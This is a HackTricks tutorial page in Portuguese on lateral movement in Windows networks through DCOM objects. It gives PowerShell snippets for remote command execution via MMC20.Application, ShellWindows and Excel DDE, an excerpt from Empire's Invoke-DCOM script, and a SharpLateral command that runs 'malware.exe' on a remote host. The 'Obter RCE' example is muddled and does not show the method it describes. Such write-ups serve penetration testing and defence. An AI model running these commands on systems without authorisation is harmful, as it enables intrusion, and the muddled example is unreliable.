# DCOM Exec

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)..

</details>

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que mais importam para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, de APIs a aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## MMC20.Application

**Para mais informações sobre essa técnica, confira o post original em [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**


Objetos do Modelo de Objetos de Componentes Distribuídos (DCOM) apresentam uma capacidade interessante para interações baseadas em rede com objetos. A Microsoft fornece documentação abrangente tanto para DCOM quanto para o Modelo de Objetos de Componentes (COM), acessível [aqui para DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) e [aqui para COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Uma lista de aplicações DCOM pode ser recuperada usando o comando PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
O objeto COM, [Classe de Aplicação MMC (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), permite a criação de scripts para operações de snap-in do MMC. Notavelmente, este objeto contém um método `ExecuteShellCommand` em `Document.ActiveView`. Mais informações sobre este método podem ser encontradas [aqui](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Verifique executando:

Essa funcionalidade facilita a execução de comandos em uma rede por meio de um aplicativo DCOM. Para interagir com o DCOM remotamente como administrador, o PowerShell pode ser utilizado da seguinte forma:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Este comando conecta-se à aplicação DCOM e retorna uma instância do objeto COM. O método ExecuteShellCommand pode então ser invocado para executar um processo no host remoto. O processo envolve os seguintes passos:

Verificar métodos:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Obter RCE:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Para mais informações sobre essa técnica, consulte o post original [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

O objeto **MMC20.Application** foi identificado como carente de "LaunchPermissions" explícitos, recorrendo a permissões que permitem acesso de Administradores. Para mais detalhes, um tópico pode ser explorado [aqui](https://twitter.com/tiraniddo/status/817532039771525120), e é recomendado o uso da ferramenta de [@tiraniddo](https://twitter.com/tiraniddo) OleView .NET para filtrar objetos sem permissão de lançamento explícita.

Dois objetos específicos, `ShellBrowserWindow` e `ShellWindows`, foram destacados devido à falta de Permissões de Lançamento explícitas. A ausência de uma entrada de registro `LaunchPermission` em `HKCR:\AppID\{guid}` significa a ausência de permissões explícitas.

###  ShellWindows
Para `ShellWindows`, que não possui um ProgID, os métodos .NET `Type.GetTypeFromCLSID` e `Activator.CreateInstance` facilitam a instanciação do objeto usando seu AppID. Esse processo utiliza o OleView .NET para recuperar o CLSID para `ShellWindows`. Uma vez instanciado, a interação é possível através do método `WindowsShell.Item`, levando à invocação de métodos como `Document.Application.ShellExecute`.

Exemplos de comandos PowerShell foram fornecidos para instanciar o objeto e executar comandos remotamente:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Movimentação lateral com Objetos DCOM do Excel

A movimentação lateral pode ser alcançada explorando objetos DCOM do Excel. Para obter informações detalhadas, é aconselhável ler a discussão sobre a alavancagem do Excel DDE para movimentação lateral via DCOM no [blog da Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

O projeto Empire fornece um script PowerShell, que demonstra a utilização do Excel para execução de código remoto (RCE) manipulando objetos DCOM. Abaixo estão trechos do script disponível no [repositório GitHub do Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), mostrando diferentes métodos para abusar do Excel para RCE:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Ferramentas de Automação para Movimentação Lateral

Duas ferramentas são destacadas para automatizar essas técnicas:

- **Invoke-DCOM.ps1**: Um script PowerShell fornecido pelo projeto Empire que simplifica a invocação de diferentes métodos para executar código em máquinas remotas. Este script está acessível no repositório do Empire GitHub.

- **SharpLateral**: Uma ferramenta projetada para executar código remotamente, que pode ser usada com o comando:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Ferramentas Automáticas

* O script Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) permite invocar facilmente todas as formas comentadas de executar código em outras máquinas.
* Você também pode usar [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Referências

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre as vulnerabilidades mais importantes para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, desde APIs até aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>Aprenda hacking na AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
